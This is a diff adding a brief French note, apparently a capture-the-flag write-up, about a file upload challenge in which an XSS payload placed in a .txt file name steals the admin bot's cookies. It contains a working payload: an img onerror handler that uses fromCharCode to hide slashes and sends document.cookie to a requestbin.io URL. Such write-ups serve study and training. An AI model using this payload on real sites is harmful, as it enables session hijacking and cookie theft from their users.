@@ -1,0 +1,8 @@
+Upload d'un fichier ayant pour but de faire une xss pour récupérer les cookies du bot (admin)
+
+Seulement les fichiers .txt passe
+
+Exemple payload dans le nom du fichier : 
+<img src=y onerror=(document.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'requestbin.io'+String.fromCharCode(47)+'1fw3pce1?'+document.cookie)>
+
+Petit troll : si src=x ça renvoie vers un gif de rick roll
